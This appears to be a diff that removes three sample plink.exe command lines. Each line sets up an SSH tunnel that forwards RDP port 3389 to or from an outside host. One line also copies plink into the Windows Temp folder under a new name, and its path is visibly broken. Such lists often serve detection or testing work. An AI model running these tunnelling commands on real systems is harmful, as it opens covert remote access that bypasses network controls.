@@ -1,3 +1,0 @@
-copy plink.exe C:\Windows\Temp ot_plink.exe && C:\Windows\Temp ot_plink.exe -R 3389:localhost:3389 -P 443 tunnel.com
-plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 8080 rdp-tunnel-vps.com
-plink.exe -L 3390:127.0.0.2:3389 -P 443 remoteserver.com
